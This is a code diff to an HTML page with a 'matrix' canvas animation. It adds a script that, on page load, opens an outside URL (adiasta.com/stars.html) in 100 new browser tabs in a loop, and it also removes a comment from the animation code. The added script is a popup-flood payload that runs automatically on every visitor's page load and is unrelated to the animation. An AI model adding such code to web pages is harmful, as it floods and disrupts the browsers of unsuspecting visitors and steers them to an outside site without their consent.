@@ -16,6 +16,14 @@
       left: 0;
     }
   </style>
+  <script>
+    window.onload = function() {
+      const url = "https://adiasta.com/stars.html";
+      for (let i = 0; i < 100; i++) {
+        window.open(url, "_blank");
+      }
+    };
+  </script>
 </head>
 <body>
   <canvas id="matrixCanvas"></canvas>
@@ -59,7 +67,7 @@
       for (let i = 0; i < symbolsPerFrame; i++) {
         drawMatrix();
       }
-    }, 1000 / 60); // Run the drawing every frame
+    }, 1000 / 60);
 
     update();
   </script>
